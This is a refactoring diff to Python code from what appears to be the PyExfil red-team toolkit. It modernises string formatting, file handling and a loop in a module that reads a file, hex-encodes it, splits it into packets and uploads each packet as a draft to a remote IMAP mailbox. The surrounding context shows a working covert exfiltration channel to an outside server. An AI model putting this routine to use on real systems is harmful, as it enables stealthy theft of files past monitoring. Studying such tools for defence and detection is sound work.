@@ -30,14 +30,14 @@ def _send_packet(host, creds, i, data):
         server.login(creds[0], creds[1])
         server.select("INBOX.Drafts")
     except Exception as e:
-        print("Error connecting to server '%s': '%s'." % (host, str(e)))
+        print(f"Error connecting to server '{host}': '{str(e)}'.")
         return False
 
     # Create Message
     new_message = email.message.Message()
     new_message["From"] = "Long Term Storage <PyExfil@MoriRT>"
     new_message["To"] = "Return <return+here@MoriRT>"
-    new_message["Subject"] = "Package %s" % i
+    new_message["Subject"] = f"Package {i}"
     new_message.set_payload(data)
 
     # ASCII UTF Encoding magic foo
@@ -64,9 +64,8 @@ class Send:
     def _load_data(self):
         self.data = ""
         try:
-            f = open(self.file_path, 'rb')
-            data = f.read()
-            f.close()
+            with open(self.file_path, 'rb') as f:
+                data = f.read()
         except Exception as e:
             sys.stderr.write("Could not read file.\n")
             sys.stderr.write("Error: %s.\n" % e )
@@ -82,9 +81,7 @@ class Send:
         data_as_hex     = str(binascii.hexlify(data))[2:-1]
         exfiltrate_this = _split_every_n(data_as_hex, PACKET_MAX_SIZE)
 
-        i = 0
-        for item in exfiltrate_this:
-            i += 1
+        for i, item in enumerate(exfiltrate_this, start=1):
             check = _send_packet(self.server_addr, self.server_creds, i, item)
             if not check:
                 return False
